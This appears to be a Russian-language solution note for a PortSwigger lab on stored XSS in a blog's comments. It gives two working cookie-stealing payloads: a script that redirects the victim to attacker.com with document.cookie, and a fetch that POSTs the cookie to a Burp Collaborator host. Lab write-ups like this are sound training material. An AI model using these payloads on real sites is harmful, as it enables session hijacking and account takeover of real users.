Эта лаборатория содержит сохраненную уязвимость XSS в функции комментариев блога. Имитируемый пользователь-жертва просматривает все комментарии после их публикации. Чтобы решить эту лабораторную работу, воспользуйтесь уязвимостью, чтобы извлечь сеансовый cookie жертвы, а затем используйте этот cookie, чтобы выдать себя за жертву.

## Дано

 - Уязвимость межсайтового скриптинга
 - Находится в функциональности комментариев.
## Задача

- извлечь сеансовый cookie жертвы

# Решение

1. Просмотреть настройки куки `httponly` false - значит доступ к куки есть на js
2. Ищем в коментах xss
3. В написание комента есть инъекция сохранённая
4. Пишем PoC
```
<script>document.location='http://attacker.com/steal?cookie='+document.cookie;</script>
```


![[Pasted image 20250225115502.png]]

PortSwigger предлагает чутка иной скрипт 
```
<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
```
- "Более современный и гибкий подход", позволяет отправлять данные без необходимости перенаправления пользователя.
- Может работать даже если у пользователя нет возможности перейти по ссылке (например, если он не заметит переход).